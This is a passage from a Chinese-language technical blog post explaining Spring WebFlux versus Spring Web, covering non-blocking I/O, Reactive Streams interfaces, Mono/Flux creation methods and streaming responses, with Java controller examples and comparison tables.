Tomcat）。其线程模型为每个请求分配一个线程，并在请求处理期间阻塞该线程，直到响应生成完毕（线程阻塞）。其缺乏内建的流式数据处理支持，且依赖多线程调度，其内存开销较大。在高并发场景下，受限于线程池大小和阻塞模型，吞吐量较低。然而，其延迟较低，适合传统的请求&#x2F;响应模型，尤其是 CPU 计算密集型 或 请求阻塞不明显 的传统 Web 应用开发。</p><p>对线程阻塞的深入理解：</p><ol><li>一个请求通常由一个线程全程处理。当程序执行到某个耗时操作（如阻塞的网络请求、阻塞的数据库查询、文件读写、或 CPU 密集计算）时，这个线程会<strong>停下来等待</strong>，直到结果返回后才能继续往下执行。</li><li>在这段等待时间里，线程既不做其他事，又无法释放，造成<strong>严重的资源浪费</strong>，系统吞吐量受限。</li><li>虽然我们可以通过<strong>异步线程池</strong>来“解耦”这些耗时操作，把任务转交给其他线程执行，释放主线程，看起来像是实现“非阻塞”，但这其实只是<strong>线程的转移</strong>，本质上仍是阻塞，只不过阻塞发生在别的线程上。更糟的是：如果主线程还需要等待异步结果返回，等于主线程和工作线程<strong>两个线程都被卡住了</strong>，反而加重了系统开销。这种方式可以称为“<strong>伪非阻塞</strong>”。</li></ol><hr><h3 id="深入理解Spring-WebFlux（Reactive-栈）"><a href="#深入理解Spring-WebFlux（Reactive-栈）" class="headerlink" title="深入理解Spring WebFlux（Reactive 栈）"></a>深入理解Spring WebFlux（Reactive 栈）</h3><p>&#x3D;&#x3D;1.Spring WebFlux（Reactive 栈）概述&#x3D;&#x3D;<br>Spring WebFlux 基于 <strong>Reactive Streams 规范</strong>构建，采用<strong>事件驱动 + 非阻塞 I&#x2F;O</strong> 的架构设计，默认使用<strong>非阻塞 I&#x2F;O 服务器</strong>（默认 Netty），借助 Reactor 库 <strong>（Mono 和 Flux）</strong> 实现异步操作，能够以较少的线程处理更多请求，资源消耗显著降低。在 I&#x2F;O 密集型 场景下，其吞吐量和响应速度表现优异，尽管响应链较长可能导致延迟略高。Spring WebFlux 特别适合 高并发 和 大量 I&#x2F;O 请求 的应用场景，例如聊天系统、实时通知和数据流处理等。</p><p>&#x3D;&#x3D;2.Reactive Streams 规范&#x3D;&#x3D;<br>既然 Spring WebFlux 是基于 Reactive Streams 规范构建的，我们若想真正搞懂 WebFlux，就绕不开对 Reactive Streams 规范的理解。而这套规范简单来说就是定义了四个核心接口：</p><ol><li><font color="#00b0f0">Publiser</font>：<ol><li>也就是负责发布数据流的数据源。我们平时使用的 Flux 和 Mono 就是 Publisher 接口的实现类。</li><li>因此可以理解为：哪里创建了 Flux 或 Mono，哪里就是一个 Publisher。</li></ol></li><li><font color="#00b0f0">Subscriber</font>：<ol><li>也就是消费数据流的“消费者”，负责处理接收到的数据。</li><li>在学习 Flux 和 Mono 时，我们接触了它们的 <code>subscribe</code> 方法，只有调用这个方法，数据流才会真正开始流动。所以可以理解为：哪里调用了 <code>subscribe</code> 方法，哪里就是 Subscriber。</li><li>常见的 Subscriber 示例有：<ol><li>WebClient：<ol><li>发起请求并消费响应数据流；</li></ol></li><li>WebFlux 框架本身：<ol><li>当调用 API 时，WebFlux 框架会在响应阶段自动订阅 Reactive 类型的返回值，将数据转换为客户端需要的格式并发送出去。</li><li>不要误以为客户端是 Subscriber，其实是 WebFlux 帮你完成了订阅和数据推送。</li></ol></li></ol></li></ol></li><li><font color="#00b0f0">Subscription</font>：<ol><li>是 Publisher 与 Subscriber 之间的桥梁，负责建立连接并控制数据流速。</li><li>它可以防止 Publisher 生产太快、而 Subscriber 消费太慢，从而导致 Publisher 缓存堆积、内存暴涨，最终可能引发内存溢出。</li><li>这正是我们常说的“<strong>背压（Backpressure）控制</strong>”，具体我们可以看下文的被压部分。</li></ol></li><li><font color="#00b0f0">Processor</font>：<ol><li>是一种同时实现了 Publisher 和 Subscriber 的组件，承担中间处理的角色。</li><li>它能够接收上游的数据，进行加工处理后，再将结果发布给下游。</li></ol></li></ol><p>&#x3D;&#x3D;3.I&#x2F;O 是什么&#x3D;&#x3D;<br>I&#x2F;O，即输入&#x2F;输出（Input&#x2F;Output），是指计算机与外部世界的信息交换过程，包括但不限于：</p><ol><li><font color="#00b0f0">网络请求</font>：<ol><li>如调用其他 HTTP API 接口（RestTemplate、WebClient）、JDBC、R2DBC 等等</li></ol></li><li><font color="#00b0f0">文件操作</font>：<ol><li>读取或写入硬盘上的文件</li></ol></li><li><font color="#00b0f0">用户交互</font>：<ol><li>键盘、鼠标等输入设备的信号获取，以及向显示器等输出设备发送信息。</li></ol></li><li><font color="#00b0f0">硬件通信</font>：<ol><li>与打印机、扫描仪等外部设备的数据交换</li></ol></li></ol><p>&#x3D;&#x3D;4.事件驱动 + 非阻塞 I&#x2F;O 是什么&#x3D;&#x3D;<br>“非阻塞 I&#x2F;O”与“阻塞 I&#x2F;O”是一对相对概念。阻塞 I&#x2F;O 指的是：主线程在执行某个依赖外部响应的操作时（比如使用 <code>RestTemplate</code> 调用 HTTP 接口，或通过 JDBC 查询数据库），会<strong>卡在原地等待</strong>数据返回，不能继续执行其它任务。</p><p>而非阻塞 I&#x2F;O 的模式是：主线程在发起操作后不会等待结果，而是转身继续处理别的任务，等到数据返回时，再通过某种机制“通知”主线程回来继续处理。这种“通知”机制，就是事件驱动模型的核心所在（理想状态，Spring WebFlux + 异步阻塞操作、异步非阻塞操作）</p><p>举个例子，当主线程遇到一个耗时操作，如果这个操作是异步非阻塞的（比如非阻塞网络请求、非阻塞数据库查询），主线程执行之后，不会呆等结果返回，而是注册一个事件及其对应的回调函数，然后立刻去处理其他任务。一旦有数据返回，比如 R2DBC 查询返回结果，就会触发事件并执行回调。如果操作未完全完成，只返回了部分数据，主线程会继续处理其他任务，等下次数据返回后再继续回调、推进后续业务流程。</p><p>这是 Spring WebFlux 碰到异步非阻塞操作结合后展现的强大优势，但当遇到本质上是同步阻塞的操作时，情况就不同了。比如同步简单操作或者同步阻塞操作，主线程依然需要等待它们执行完才能继续处理其他任务。然而，这种做法显然不合理，因为主 Reactive 线程需要同时处理成千上万个请求。如果某个操作长时间阻塞，主线程将无法高效处理其他任务，这显然是不可接受的。<font color="#ff0000">因此，我们约定：在主 Reactive 流（如 <code>flatMap</code>、<code>doOnNext</code> 等操作符内部）中，禁止执行任何严重阻塞操作，允许出现三类操作：同步简单操作、异步阻塞操作、异步非阻塞操作</font>。</p><p>对于执行同步阻塞操作这类场景，WebFlux 推荐将其转移到一个专门的 “阻塞友好线程池” 中去执行。执行完成后再将结果返回主线程。和传统的阻塞模型不同的是，虽然线程池中的线程仍是阻塞的，但主线程不会被挂起，而是继续处理其他任务，等结果回来后再处理该请求。这有效避免了主 Reactive 线程的长时间占用，使其保持轻量、高效。</p><p>这样一来，除了主 Reactive 线程在执行同步简单操作时略有耗时，其它包括异步阻塞、异步非阻塞的操作都不会阻塞主线程。主线程可以继续处理更多任务，从而实现以少量线程支撑大量并发请求的目标。</p><p>综上所述，我们可以总结出以下规律：</p><ol><li>Spring WebFlux 虽然提供了非阻塞的能力，但能否真正实现非阻塞，取决于你的技术栈：<ol><li>Spring WebFlux + 异步非阻塞操作 &#x3D; 完全非阻塞操作（王炸组合、理想组合）</li><li>Spring WebFlux + 异步阻塞操作 &#x3D; 主线程非阻塞、异步线程池阻塞（虽然稍逊，但比同步阻塞要强的多）</li><li>Spring WebFlux + 同步简单操作 &#x3D; 主线程阻塞（主线程短暂阻塞（通常可接受）</li><li>Spring WebFlux + 同步阻塞操作 &#x3D; 主线程严重阻塞主线程严重阻塞（不可接受，必须避免）</li></ol></li><li>我们约定：在主 Reactive 流（如 <code>flatMap</code>、<code>doOnNext</code> 等操作符内部）中，禁止执行任何严重阻塞操作，允许出现三类操作：同步简单操作、异步阻塞操作、异步非阻塞操作</li></ol><p>&#x3D;&#x3D;5.非阻塞 I&#x2F;O 服务器&#x3D;&#x3D;<br>其实，Spring WebFlux 程序并非只能运行在非阻塞 I&#x2F;O 服务器上，它同样也可以部署在 Servlet 容器中。虽然在不同类型的服务器上，开发者编写的代码几乎一致，但它们在底层的执行机制上却截然不同，这一点我们必须清楚。</p><p>在上文中我们提到，Spring WebFlux 的主线程在遇到耗时操作时会“放下”当前任务，去处理其他请求，看起来好像是 WebFlux 本身很智能，但其实这并非 WebFlux 的功劳，而是它底层所依赖的非阻塞 I&#x2F;O 服务器（如 Netty）在发挥作用。只有在使用非阻塞服务器时，请求才能由单线程事件循环异步处理，从而实现真正的高并发与资源高效利用。</p><p>然而，如果将 WebFlux 部署在传统的 Servlet 容器上（例如 Tomcat），底层仍旧是“一请求一线程”的处理模型。这种线程池的方式违背了响应式架构的核心理念。以如下示例代码为例：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyController</span> &#123;<br>    <br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/flux&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Mono&lt;String&gt; flux() &#123; <br>        <span class="hljs-keyword">return</span> Mono.just(<span class="hljs-string">&quot;WebFlux&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>尽管我们在接口中返回了 <code>Mono&lt;String&gt;</code>，但 Tomcat 并不具备真正的响应式、非阻塞能力，它仅通过 Servlet 3.1 的 Async API 对“异步”进行了模拟，流程上还是阻塞的。这种模拟虽可正常运行，但性能上无法真正发挥响应式编程的优势。</p><p>下图展示了 Servlet 与非阻塞服务器在模型上的根本差异：</p><table><thead><tr><th>对比点</th><th>阻塞 I&#x2F;O（如 Tomcat）</th><th>非阻塞 I&#x2F;O（如 Netty）</th></tr></thead><tbody><tr><td>请求处理模型</td><td>每个请求对应一个线程</td><td>单线程事件循环，异步处理所有连接</td></tr><tr><td>I&#x2F;O 行为</td><td>等数据可用或写入完成前线程阻塞</td><td>不等，先注册事件，数据到来再处理</td></tr><tr><td>并发连接能力</td><td>线程资源受限（线程多了开销大）</td><td>资源消耗极低，能处理非常多连接</td></tr><tr><td>内存压力</td><td>线程多了容易爆内存</td><td>单线程或少量线程，内存更可控</td></tr><tr><td>编程模型</td><td>同步、阻塞调用</td><td>响应式、异步调用</td></tr><tr><td>响应式支持</td><td>无响应式支持，流程阻塞</td><td>原生响应式，支持流式数据处理</td></tr><tr><td>吞吐量</td><td>中等，受限于线程池</td><td>高，利用非阻塞机制提高并发处理能力</td></tr><tr><td>延迟</td><td>低，线程直通，响应快速</td><td>略高，响应链长，调度复杂</td></tr></tbody></table><p>此外，在高并发场景下，Spring WebFlux 在不同服务器上的性能差异也非常明显：</p><table><thead><tr><th>服务器</th><th>最大并发量（4核8G）</th><th>最大并发量（4核16G）</th></tr></thead><tbody><tr><td>Tomcat</td><td>5000 连接</td><td>10000 连接</td></tr><tr><td>Netty</td><td>50000 连接</td><td>100000 连接</td></tr></tbody></table><p>&#x3D;&#x3D;6.Mono 和 Flux&#x3D;&#x3D;<br><code>Mono</code> 和 <code>Flux</code> 是 Reactor 的核心组件，Spring WebFlux 强烈建议我们所有的方法返回值都使用 <code>Mono</code> 或 <code>Flux</code>。简单来说，如果你希望执行异步非阻塞操作，就必须将其封装在 <code>Mono</code> 或 <code>Flux</code> 中，从而在响应式流中执行。</p><p>需要注意的是，即便你没有显式返回 <code>Mono</code> 或 <code>Flux</code>，比如直接写 <code>return &quot;data&quot;</code>，Spring WebFlux 也会自动将你的返回值包装成 <code>Mono</code> 或 <code>Flux</code>。虽然这样看似返回了 <code>Mono</code> 或 <code>Flux</code>，但这通常意味着你的代码逻辑仍是<strong>同步阻塞的</strong>（因为你无法使用异步非阻塞操作），无法真正利用 Spring WebFlux 提供的非阻塞能力和异步执行的优势，只是将结果进行了一层华丽的包装。例如，下面的代码就是一个典型的阻塞调用：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">@RestController<br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> UserController &#123;<br><br>    @GetMapping(&quot;/users/lazy&quot;)<br>    <span class="hljs-built_in">public</span> List&lt;<span class="hljs-keyword">User</span>&gt; getUsersLazily() &#123;<br>        List&lt;<span class="hljs-keyword">User</span>&gt; allUsers = <span class="hljs-built_in">new</span> ArrayList&lt;&gt;();<br>        <span class="hljs-type">int</span> pageSize = <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> page = <span class="hljs-number">0</span>; page &lt; <span class="hljs-number">100</span>; page++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-keyword">offset</span> = page * pageSize;<br>            List&lt;<span class="hljs-keyword">User</span>&gt; pageUsers = jdbcTemplate.query(<br>                &quot;SELECT * FROM users LIMIT ? OFFSET ?&quot;,<br>                <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;pageSize, <span class="hljs-keyword">offset</span>&#125;,<br>                (rs, rowNum) -&gt; <span class="hljs-built_in">new</span> <span class="hljs-keyword">User</span>(<br>                    rs.getInt(&quot;id&quot;),<br>                    rs.getString(&quot;name&quot;)<br>                )<br>            );<br>            <span class="hljs-keyword">if</span> (pageUsers.isEmpty()) &#123;<br>                break;<br>            &#125;<br>            allUsers.addAll(pageUsers);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> allUsers;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上所示，尽管 Spring WebFlux 会将返回值包装成 <code>Mono</code> 或 <code>Flux</code>，但由于内部仍使用了阻塞式的 <code>JDBC</code>，因此代码的执行依然是同步阻塞的，未能发挥出 WebFlux 的非阻塞特性。</p><p><font color="#ff0000">因此，我们约定：在 Spring WebFlux 中，所有方法的返回值应当返回 <code>Mono</code> 或 <code>Flux</code>，确保所有操作都在响应式流中异步执行</font>。</p><hr><h3 id="2-对-Spring-WebFlux-深入理解"><a href="#2-对-Spring-WebFlux-深入理解" class="headerlink" title="2. 对 Spring WebFlux 深入理解"></a>2. 对 Spring WebFlux 深入理解</h3><p>&#x3D;&#x3D;1.Spring Web（Servlet 栈）&#x3D;&#x3D;<br>Spring Web 采用传统的阻塞式编程模型，基于 Servlet API，默认使用 Servlet 容器（如 Tomcat）。其线程模型为每个请求分配一个线程，并在请求处理期间阻塞该线程，直到响应生成完毕（线程阻塞）。其缺乏内建的流式数据处理支持，且依赖多线程调度，其内存开销较大。在高并发场景下，受限于线程池大小和阻塞模型，吞吐量较低。然而，其延迟较低，适合传统的请求&#x2F;响应模型，尤其是 CPU 计算密集型 或 请求阻塞不明显 的传统 Web 应用开发。</p><p>对线程阻塞的深入理解：</p><ol><li>一个请求通常由一个线程全程处理。当程序执行到某个耗时操作（如阻塞的网络请求、阻塞的数据库查询、文件读写、或 CPU 密集计算）时，这个线程会<strong>停下来等待</strong>，直到结果返回后才能继续往下执行。</li><li>在这段等待时间里，线程既不做其他事，又无法释放，造成<strong>严重的资源浪费</strong>，系统吞吐量受限。</li><li>虽然我们可以通过<strong>异步线程池</strong>来“解耦”这些耗时操作，把任务转交给其他线程执行，释放主线程，看起来像是实现“非阻塞”，但这其实只是<strong>线程的转移</strong>，本质上仍是阻塞，只不过阻塞发生在别的线程上。更糟的是：如果主线程还需要等待异步结果返回，等于主线程和工作线程<strong>两个线程都被卡住了</strong>，反而加重了系统开销。这种方式可以称为“<strong>伪非阻塞</strong>”。</li></ol><p>&#x3D;&#x3D;2.Spring WebFlux（Reactive 栈）&#x3D;&#x3D;<br>Spring WebFlux 基于 Reactive Streams 规范构建，采用事件驱动 + 非阻塞 I&#x2F;O 的架构设计，使用非阻塞 I&#x2F;O 服务器（默认 Netty），借助 Reactor 库（Mono 和 Flux）实现异步操作，能够以较少的线程处理更多请求，资源消耗显著降低。在 I&#x2F;O 密集型 场景下，其吞吐量和响应速度表现优异，尽管响应链较长可能导致延迟略高。Spring WebFlux 特别适合 高并发 和 大量 I&#x2F;O 请求 的应用场景，例如聊天系统、实时通知和数据流处理等。</p><p>对非阻塞 I&#x2F;O 的深入理解：</p><ol><li>Spring WebFlux 的非阻塞 I&#x2F;O 模型有所不同。它不是通过线程切换来“回避阻塞”，而是以事件驱动 + 回调机制的方式从根本上规避阻塞。需要特别注意的是：“<font color="#ff0000">Spring WebFlux 仅提供非阻塞的能力，是否真正实现非阻塞，取决于你的整体技术栈，简单来说，Spring WebFlux + 异步非阻塞操作 &#x3D; 王炸</font>”。</li><li>举个例子，当主线程遇到一个耗时操作，如果这个操作是异步非阻塞的（比如非阻塞网络请求、非阻塞数据库查询），主线程不会呆等结果返回，而是注册一个事件及其对应的回调函数，然后立刻去处理其他任务。一旦有数据返回，比如 R2DBC 查询返回结果，就会触发事件并执行回调。如果操作未完全完成，只返回了部分数据，主线程会继续处理其他任务，等下次数据返回后再继续回调、推进后续业务流程。</li><li>但如果这个操作是同步简单操作或同步阻塞操作，主线程仍然必须等它执行完才能继续。要注意的是，主 Reactive 线程承担着成千上万个请求，如果它被某个操作长时间阻塞，显然是不可接受的。因此，<font color="#ff0000">我们约定：在主 Reactive 流（如 <code>flatMap</code>、<code>doOnNext</code> 等操作符内部）中，禁止执行任何阻塞操作，只允许出现两类操作：同步简单操作、异步非阻塞操作</font>。</li><li>那么问题来了，如果必须执行同步阻塞操作怎么办？对于这类场景，WebFlux 支持将其转移到一个专门的“阻塞友好线程池”中去执行。执行完成后再将结果返回主线程。和传统的阻塞模型不同的是，虽然线程池中的线程仍是阻塞的，但主线程不会被挂起，而是继续处理其他任务，等结果回来后再处理该请求。这有效避免了主 Reactive 线程的长时间占用，使其保持轻量、高效。</li><li>这样一来，除了主 Reactive 线程在执行同步简单操作时略有耗时，其它包括异步阻塞、异步非阻塞的操作都不会阻塞主线程。主线程可以继续处理更多任务，从而实现以少量线程支撑大量并发请求的目标。</li></ol><p>&#x3D;&#x3D;3.两者对比表&#x3D;&#x3D;</p><table><thead><tr><th>项目</th><th>Spring Web（Tomcat）</th><th>Spring WebFlux（Netty）</th></tr></thead><tbody><tr><td><strong>并发模型</strong></td><td>每请求一个线程（阻塞）</td><td>单线程事件驱动，非阻塞处理</td></tr><tr><td><strong>适用场景</strong></td><td>计算密集型 &#x2F; 阻塞不明显的中低并发场景</td><td>高并发、I&#x2F;O 密集、实时响应</td></tr><tr><td><strong>资源占用</strong></td><td>多线程调度，线程上下文开销大</td><td>少量线程处理大量请求，资源占用低</td></tr><tr><td><strong>响应式支持</strong></td><td>无响应式支持，流程阻塞</td><td>原生响应式，支持流式数据处理</td></tr><tr><td><strong>返回 JSON</strong></td><td>使用 Jackson + HttpMessageConverter</td><td>使用 Jackson + HttpMessageWriter</td></tr><tr><td><strong>编程风格</strong></td><td>命令式，流程清晰，开发简单</td><td>响应式，链式调用，开发思维门槛高</td></tr><tr><td><strong>学习曲线</strong></td><td>低，传统经验易迁移</td><td>高，需要理解响应式思想</td></tr><tr><td><strong>吞吐量</strong></td><td>中等，受限于线程池</td><td>高，利用非阻塞机制提高并发处理能力</td></tr><tr><td><strong>延迟（Latency）</strong></td><td>低，线程直通，响应快速</td><td>响应链长，调度复杂，延迟略高</td></tr></tbody></table><hr><h3 id="3-对-“流”-深入理解"><a href="#3-对-“流”-深入理解" class="headerlink" title="3. 对 “流” 深入理解"></a>3. 对 “流” 深入理解</h3><p>Reactor、Spring WebFlux 等框架的核心就是通过返回流（<code>Mono</code> 或 <code>Flux</code>）来管理异步操作的控制流。即便你在内部做的是阻塞操作，返回一个 <code>Mono</code> 或 <code>Flux</code> 也能保持与其他异步操作的协作性和合适的线程调度。</p><p>也就是，能返回流就返回流，不管你是执行异步阻塞操作，还是异步非阻塞</p><p>在 Spring WebFlux 中，真正的流式处理主要涉及两个方面：</p><ol><li>&#x3D;&#x3D;服务器接受流式数据&#x3D;&#x3D;：<ol><li>通常涉及数据库查询、网络请求等外部数据源返回数据给服务器。对于这类操作，我们不能依赖同步阻塞或异步阻塞机制。比如，JDBC 会一次性拉取所有数据并返回，HttpClient 调用外部服务时也会等待所有响应返回，这种方式属于“阻塞”模式，不适合流式数据处理。</li><li>为了实现真正的流式输出，我们需要采用异步非阻塞操作。例如，R2DBC 以逐行的方式从数据库返回数据，WebClient 也采用类似的机制。这也是为什么我们说：“Spring WebFlux + 异步非阻塞操作 &#x3D; 王炸”。</li></ol></li><li>&#x3D;&#x3D;服务器发送流式数据给客户端&#x3D;&#x3D;：<ol><li>默认情况下，Spring WebFlux 的返回并不是流式的，要实现真正的流式响应，必须满足以下四个条件：</li><li>使用 <code>Flux&lt;T&gt;</code> 返回多个元素</li><li><code>Flux</code> 必须懒生成（☆☆☆）</li><li>设置正确的 <code>Content-Type</code>（例如 <code>text/event-stream</code> 或 <code>application/stream+json</code>）</li><li>客户端需要支持 chunked transfer 或 SSE（服务器推送事件）</li><li>如果缺少任何一个条件，流式效果无法实现。例如，即使你使用了 <code>Flux</code>、懒加载，并且客户端支持，但如果没有正确设置 <code>Content-Type</code>，客户端会一直处于加载状态，直到最终一次性返回所有数据，这时数据会“哐哐”全部输出。</li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">懒加载</font>：<ol><li>Flux 或 Mono 在没有人订阅（subscribe）之前，它<strong>啥都不干</strong></li><li>只有当你调用 <code>.subscribe()</code> 的时候，它才真的发数据，这叫懒加载</li></ol></li><li><font color="#00b0f0">懒生成</font>：<ol><li>数据不是一次性准备好的，而是<strong>边订阅边生成</strong>的。</li><li>以 <code>Flux.just(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;)</code> 为例，一旦你订阅，虽然会按照 A -&gt; B -&gt; C 依次发出，但它把所有数据都已经准备好了，不是懒生成。</li><li>再以 <code>Flux.interval(Duration.ofSeconds(1))</code> 为例，是边订阅边生成的：它每秒生成一个数，是真·懒生成。</li></ol></li></ol></blockquote><p>Flux 依次发出数据</p><hr><h3 id="4-高并发环境下-WebFlux-性能表现"><a href="#4-高并发环境下-WebFlux-性能表现" class="headerlink" title="4. 高并发环境下 WebFlux 性能表现"></a>4. 高并发环境下 WebFlux 性能表现</h3><hr><h3 id="5-Mono"><a href="#5-Mono" class="headerlink" title="5. Mono"></a>5. Mono</h3><h4 id="5-1-Mono-概述"><a href="#5-1-Mono-概述" class="headerlink" title="5.1. Mono 概述"></a>5.1. Mono 概述</h4><p><code>Mono</code> 表示一个可能包含 0 或 1 个元素 的异步数据流。它可以承载一个元素或一个空值，例如下面代码中， <code>Hello, World!</code> 就是一个元素；</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Mono&lt;String&gt; mono <span class="hljs-operator">=</span> Mono.just(<span class="hljs-string">&quot;Hello, World!&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>“元素”的概念是基于 <code>Mono&lt;T&gt;</code> 中的泛型类型来理解的。比如 <code>Mono&lt;String&gt;</code> 中一个 <code>String</code> 类型就是一个元素；如果是 <code>Mono&lt;Object&gt;</code>，那一个 <code>Object</code> 类型就是一个元素。</li></ol></blockquote><hr><h4 id="5-2-Mono-相关方法"><a href="#5-2-Mono-相关方法" class="headerlink" title="5.2. Mono 相关方法"></a>5.2. Mono 相关方法</h4><h5 id="5-2-1-前言"><a href="#5-2-1-前言" class="headerlink" title="5.2.1. 前言"></a>5.2.1. 前言</h5><p>我们约定：在主 Reactive 流（如 <code>flatMap</code>、<code>doOnNext</code> 等操作符内部）中，不得放置任何阻塞操作，只允许包含两类操作：</p><ol><li>同步简单操作</li><li>异步非阻塞操作</li></ol><p>对于 同步阻塞操作，必须通过 <code>mono.subscribeOn</code> 将其调度到 “阻塞友好线程” 中，因此，以后我们提到 “异步阻塞操作” ，实际上是指：<strong>将原本是同步阻塞的操作，调度到阻塞友好线程中执行</strong>，从而避免阻塞 Reactor 的工作线程，保持响应式流的非阻塞特性。</p><hr><h5 id="5-2-2-Mono-实例创建方法"><a href="#5-2-2-Mono-实例创建方法" class="headerlink" title="5.2.2. Mono 实例创建方法"></a>5.2.2. Mono 实例创建方法</h5><ol><li><code>Mono.just(T data)</code>：<ol><li>从一个确定且非 <code>null</code> 的值创建 Mono（可以为空字符串 <code>&quot;&quot;</code>），直接发出该值</li></ol></li><li><code>Mono.justOrEmpty(T data)</code>：<ol><li>从一个可能为 <code>null</code> 的值创建 Mono，若为 <code>null</code> 则返回空 Mono</li></ol></li><li><code>Mono.empty()</code>：<ol><li>创建不发出任何元素且立即完成的空 Mono</li></ol></li><li><code>Mono.fromCallable(Callable&lt;R&gt;)</code>：<ol><li>从 <code>Callable</code> 创建 Mono，无论 <code>Callable</code> 返回值是什么，最终都将被包装为一个 Mono，适用于封装同步简单操作、异步阻塞操作、异步非阻塞操作</li><li>这里异步阻塞操作指的是结合 <code>subscribeOn</code> 异步化阻塞操作（使成为异步阻塞操作），避免占用主 Reactive 线程过多时间<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/api&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MonoExamples</span> &#123;<br><br>    <span class="hljs-comment">// 1. Mono.just(T data)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/just&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">just</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; mono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        <span class="hljs-keyword">return</span> mono;<br>    &#125;<br><br>    <span class="hljs-comment">// 2. Mono.justOrEmpty(T data)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/justOrEmpty&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">justOrEmpty</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span>(required = <span class="hljs-literal">false</span>) <span class="hljs-title class_">String</span> input</span>) &#123;<br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; mono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">justOrEmpty</span>(input);<br>        <span class="hljs-keyword">return</span> mono;<br>    &#125;<br><br>    <span class="hljs-comment">// 3. Mono.empty()</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/empty&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">empty</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; mono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">empty</span>();<br>        <span class="hljs-keyword">return</span> mono;<br>    &#125;<br><br>    <span class="hljs-comment">// 4. Mono.fromCallable(Callable&lt;R&gt;)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/fromCallable&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">fromCallable</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; mono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">fromCallable</span>(() -&gt; &#123;<br>        <span class="hljs-comment">// 模拟阻塞操作</span><br>            <span class="hljs-title class_">Thread</span>.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">1000</span>); <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;data from callable&quot;</span>;<br>        &#125;).<span class="hljs-title 